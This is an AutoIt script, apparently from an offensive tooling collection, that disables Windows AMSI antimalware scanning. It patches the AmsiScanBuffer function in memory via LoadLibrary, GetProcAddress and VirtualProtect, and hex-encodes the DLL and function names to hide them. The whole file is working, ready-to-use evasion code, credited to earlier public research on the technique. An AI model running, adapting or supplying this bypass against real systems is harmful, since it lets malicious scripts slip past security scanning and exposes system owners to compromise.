#include <WinAPIRes.au3>
#include <WinAPISys.au3>
#include <String.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Bypasses AMSI by patching amsi.dll.

 Notes:
    Adapted from - https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
    Credits - FatRodzianko (https://github.com/FatRodzianko)

    Initial bypass technique discovered by Rastamouse (https://twitter.com/_RastaMouse)
    Reference - https://rastamouse.me/memory-patching-amsi-bypass/

 Example usage:
    https://github.com/V1V1/OffensiveAutoIt/blob/main/Execution/ExecutePowerShell/ExecutePowerShell.au3

#ce --------------------------------------------------------------------------------

Func _PatchAMSI()

    ConsoleWrite("[*] Patching AMSI" & @CRLF & @CRLF)

    ; Define patch bytes - specifically for 64 bit process
    $patchBytes = "0x31C0057801197F05DFFEED00C3"

    ; Get ASB location
    $adll = _HexToString("0x616d73692e646c6c")
    $amLib = _WinAPI_LoadLibrary($adll)
    If $amLib = 0 Then
        ConsoleWrite("[X] Couldn't load DLL." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get ASB address
    $asb = _HexToString("0x416d73695363616e427566666572")
    $asbLoc = _WinAPI_GetProcAddress($amLib, $asb)

    If $asbLoc = 0 Then
        ConsoleWrite("[X] Failed to get ASB memory address." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Patch length
    $patchSize = BinaryLen($patchBytes)

    ; VirtualProtect - make memory region writable
    $vpCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $asbLoc, _
        "long", $patchSize, _
        "dword", 0x40, _
        "dword*", 0)

    $hProtect = $vpCall[0]
    $oldProtect = $vpCall[4]

    ; Byte array to the address
    Local $patchBuffer = DllStructCreate("byte[" & $patchSize & "]", $asbLoc)
    ; Copy patch
    DllStructSetData($patchBuffer, 1, $patchBytes)

    ; Restore region to RX
    $resCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $asbLoc, _
        "long", $patchSize, _
        "dword", $oldProtect, _
        "dword*", 0)

    ConsoleWrite("  [+] AMSI patch successful" & @CRLF & @CRLF)

EndFunc ;==>_PatchAMSI()
